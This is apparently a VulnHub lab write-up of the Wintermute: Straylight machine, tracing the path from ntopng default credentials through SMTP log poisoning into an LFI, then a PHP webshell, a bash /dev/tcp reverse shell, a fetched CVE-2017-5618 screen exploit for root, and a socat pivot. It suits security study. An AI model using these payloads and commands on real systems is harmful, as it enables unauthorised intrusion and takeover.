---
title: "Wintermute: Straylight"
date: 2026-10-27
categories: [VulnHub, Medium]
tags: [linux, smtp, log poisoning, LFI, RCE, default credentials, ntopng, SUID, screen, cve-2017-5618, pivoting, port forwarding, privilege escalation, arp-scan, nmap, whatweb, curl, netcat, searchsploit, socat, python, ssh]
image:
  path: /assets/img/VulnHub/Wintermute-Straylight/banner.webp
  lqip: "data:image/webp;base64,UklGRnwAAABXRUJQVlA4IHAAAABwBQCdASogACAAPu1kqU2ppaQiMAgBMB2JZwDE6f/gPJA9O75lgXfone9VSQbHrUauvYwAAP7ugKlbHM7xdvE7XqXHhi85b5v0o93+Ehjzw70+JCQpVhoVeVi6ZhkAJ1gC5dEyRRiMfBH8ARXAVYAA"
  alt: "Wintermute: Straylight writeup"
lab:
  name: Wintermute
  order: 1
---

Straylight is the entry point of **Wintermute: 1**, a two-machine **VulnHub** pivoting lab I run in my self-hosted eJPTv2 range. It is the only host my attack network can even see; its twin, [Neuromancer](/posts/wintermute-neuromancer/), lives on an isolated internal network reachable *only* through this box. Straylight alone is a tidy chain — **ntopng** default credentials leak a hidden `turing-bolo` endpoint, an **LFI** there becomes RCE through **SMTP log poisoning** (a PHP webshell hand-delivered inside an email with `netcat`) for a `www-data` shell, and a SUID **GNU Screen 4.5.0** (**CVE-2017-5618**) gives root — and then it becomes the launch point for the pivot into the internal network. The pivoting is the heart of this lab, so it gets the most detail, and my own scripts and sessions are kept in full.

| Field      | Details        |
|------------|----------------|
| Platform   | VulnHub        |
| Difficulty | Medium         |
| OS         | Linux          |
| IP         | 192.168.57.6 (host-only) · 10.0.0.100 (internal) |
| Download   | [Wintermute: 1](https://www.vulnhub.com/entry/wintermute-1,239/) |
| Date       | October 2026   |

## Tools Used

| Tool        | Description                                                           |
|-------------|-----------------------------------------------------------------------|
| arp-scan    | Discovered the lab hosts on the host-only network                    |
| nmap        | Port scanning and service fingerprinting                             |
| whatweb     | Web fingerprinting (ntopng on `:3000`)                               |
| curl        | Drove the LFI and triggered the webshell                             |
| netcat (nc) | Hand-sent the SMTP email for log poisoning, and the shell listeners  |
| searchsploit| Located the `screen` exploit                                         |
| socat       | The pivot — forwarded Neuromancer's internal ports out through this host |
| Python      | `http.server` to stage the exploit script                           |
| ssh         | Stable root access and persistence                                   |

## Lab Setup

All the VMs run in VirtualBox with two networks: a **host-only** adapter (`vboxnet1`, `192.168.57.0/24` — my host is `.1`) that reaches the first machine, and an **internal** network (`intnet`, `10.0.0.0/24`, DHCP) that only the VMs can see. That internal network is the whole point — [Neuromancer](/posts/wintermute-neuromancer/) lives there, invisible from my host until I tunnel through Straylight. An `arp-scan` on the host-only side finds Straylight at **192.168.57.6**:

```bash
sudo arp-scan -I vboxnet1 --localnet
# 192.168.57.6   08:00:27:20:83:27   PCS Systemtechnik GmbH   (straylight)
```

## Reconnaissance & Enumeration

```bash
sudo nmap -p- -sCV 192.168.57.6 -oN nmap
```

```bash
PORT     STATE SERVICE  VERSION
25/tcp   open  smtp     Postfix smtpd   (hostname: straylight; VRFY enabled)
80/tcp   open  http     Apache httpd 2.4.25 ((Debian))   (title: Night City)
3000/tcp open  http     ntopng   (title: Welcome to ntopng)
```

Three services: **SMTP** (Postfix), an Apache site, and **ntopng** (a network-traffic monitor) on 3000. ntopng ships with well-known default credentials — **`admin:admin`** works — and inside its traffic dashboard (`flows_stats.lua`) there's a revealing flow: a local request to `http://127.0.0.1:80/turing-bolo/`. That's a path we'd never have found by fuzzing, handed to us by the monitoring tool.

### The LFI in turing-bolo

`/turing-bolo/bolo.php` takes a **`bolo`** parameter that selects which activity log to display — it reads the given path and renders it. Feeding it an absolute path turns it into a **Local File Inclusion**. The most useful file to target is the Postfix mail log, because we can *write* to that log remotely by sending mail:

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail'
# ... renders the full Postfix mail log in the page ...
```

Crucially, `bolo.php` **includes** the file as PHP, not just prints it — so if we can get PHP code *into* a file it reads, that code executes.

## Initial Access — SMTP Log Poisoning → RCE as `www-data`

### Poisoning the mail log with netcat

This is the key technique: Postfix logs the **subject** of every mail it processes into `/var/log/mail`. If the subject contains PHP, that PHP ends up in the log — which `bolo.php` then executes. So I talk SMTP by hand with `netcat` and put a webshell in the subject line:

```bash
nc -nv 192.168.57.6 25
```

```text
220 straylight ESMTP Postfix (Debian/GNU)
HELO ander
250 straylight
mail from: ander@ander.com
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <pre> <?php system($_GET['cmd']); ?> </pre>
data2
.
250 2.0.0 Ok: queued as 9AB7F2DDA
```

Step by step: `HELO` opens the session, `mail from:` / `rcpt to:` set a (throwaway) sender and a valid local recipient (`root`), `data` begins the message, the **`subject:`** line carries the PHP payload, a line of body text, and a single `.` on its own line ends the message. Postfix accepts and queues it — and writes that subject into the mail log.

Now the log contains `<?php system($_GET['cmd']); ?>`. Requesting the log through `bolo.php` executes it, and the `cmd` parameter becomes arbitrary command execution:

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=id'
# ... the page now shows: uid=33(www-data) gid=33(www-data) ...
```

### Reverse shell

With RCE confirmed, I URL-encode a Bash reverse shell into the `cmd` parameter (`%20`=space, `%26`=`&`, `%2F`=`/`) and catch it:

```bash
# listener
nc -nlvp 4444
```

```bash
curl -s 'http://192.168.57.6/turing-bolo/bolo.php?bolo=/var/log/mail&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.57.1%2F4444%200%3E%261%27'
```

```bash
Connection received on 192.168.57.6 42208
www-data@straylight:/var/www/html/turing-bolo$
```

A shell as **`www-data`**; after the usual TTY upgrade, on to privesc.

## Privilege Escalation — `www-data` → `root` (SUID `screen 4.5.0` CVE-2017-5618)

The SUID hunt returns one very specific, very old binary:

```bash
www-data@straylight:/$ find / -perm -4000 2>/dev/null
/bin/screen-4.5.0
```

**GNU Screen 4.5.0** is vulnerable to **CVE-2017-5618** — it mishandles a user-supplied logfile path while holding root privileges, allowing an attacker to write a root-owned `/etc/ld.so.preload` and load a malicious shared library into a root process. Exploit-DB ships a ready script (41154):

```bash
searchsploit -m linux/local/41154.sh
python3 -m http.server       # serve it from the host
```

```bash
www-data@straylight:/tmp$ curl -s http://192.168.57.1:8000/privEsc.sh -o privEsc.sh
www-data@straylight:/tmp$ chmod +x privEsc.sh && ./privEsc.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
# whoami
root
# cat /root/flag.txt
REDACTED
```

Root on Straylight. `/root/note.txt` is the pivot's breadcrumb — it mentions a user **Lady 3Jane**, a custom Java app on **Neuromancer's** server, and a Tomcat deployment at **`/struts2_2.3.15.1-showcase`**, on an *internal admin network*.

## Pivoting to Neuromancer

### A second interface

As root on Straylight, its interfaces reveal the dual-homing that makes this box a pivot lab — it sits on both the host-only network *and* an internal `10.0.0.0/24`:

```bash
root@straylight:/$ ip a
# enp0s3: inet 192.168.57.6/24   (reachable from my host)
# enp0s8: inet 10.0.0.100/24     (internal-only network)
```

My host cannot route to `10.0.0.0/24`; Straylight is the only bridge. A ping sweep from Straylight finds a neighbour:

```bash
root@straylight:/$ for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i >/dev/null && echo "10.0.0.$i up"; done
# 10.0.0.1 up
# 10.0.0.100 up   (straylight itself)
# 10.0.0.101 up   (neuromancer)
```

A quick Bash `/dev/tcp` port scan of **10.0.0.101** (no nmap on the box) shows three ports:

```bash
# 8009 (ajp13)   8080 (Tomcat)   34483 (SSH)
```

### socat: forwarding the internal services outward

Here's the core of the pivot. Straylight can reach Neuromancer; my host can reach Straylight; so I make **Straylight relay** each of Neuromancer's ports back to my side. `socat tcp-listen:<port>,fork tcp-connect:10.0.0.101:<port>` makes Straylight listen on a port (on its `192.168.57.6` interface, among others) and forward every connection to Neuromancer:

```bash
root@straylight:/tmp$ socat tcp-listen:8080,reuseaddr,fork tcp-connect:10.0.0.101:8080 &
root@straylight:/tmp$ socat tcp-listen:8009,reuseaddr,fork tcp-connect:10.0.0.101:8009 &
root@straylight:/tmp$ socat tcp-listen:34483,reuseaddr,fork tcp-connect:10.0.0.101:34483 &
```

Now, from my host, hitting `192.168.57.6:8080` actually reaches **Neuromancer's Tomcat** — I can nmap and exploit the hidden machine as if it were local:

```bash
sudo nmap -p8080,8009,34483 -sCV 192.168.57.6 -oN nmap2
# 8009  ajp13   Apache Jserv (v1.3)
# 8080  http    Apache Tomcat 9.0.0.M26
# 34483 ssh     OpenSSH 7.2p2 Ubuntu
```

With those relays running, the rest of the lab happens against the hidden machine — continue in the **[Neuromancer](/posts/wintermute-neuromancer/)** writeup.

## Root Proof

| Host       | File             | Proof      |
|------------|------------------|------------|
| straylight | `/root/flag.txt` | `REDACTED` |

## Key Takeaways

- **Monitoring tools leak internal structure.** ntopng with `admin:admin` didn't just grant a login — its traffic dashboard revealed the internal `turing-bolo` endpoint that was the entire web attack surface. Default credentials on an observability tool hand an attacker a map of the host.
- **SMTP log poisoning is LFI's classic partner.** When an LFI *includes* a file as code and you can write to a log (mail, SSH, Apache), you have RCE. Sending the payload by hand over `netcat` — PHP in the mail `subject:` — is a technique worth being fluent in; it needs no upload, just a valid recipient.
- **A dual-homed host is a gateway.** The moment `ip a` showed a second NIC on `10.0.0.0/24`, Straylight stopped being the target and became the *route* to [Neuromancer](/posts/wintermute-neuromancer/). Enumerate every interface on every host you own; a quiet second NIC is the whole point of a pivot lab.
- **Pivoting is just relaying connections.** `socat tcp-listen:X,fork tcp-connect:10.0.0.101:X` forwarded Neuromancer's services *outward* so I could attack them from my host as if they were local. Keeping straight who can reach whom is the whole skill — and the reverse direction (getting a shell back) is where [Neuromancer](/posts/wintermute-neuromancer/) picks up.
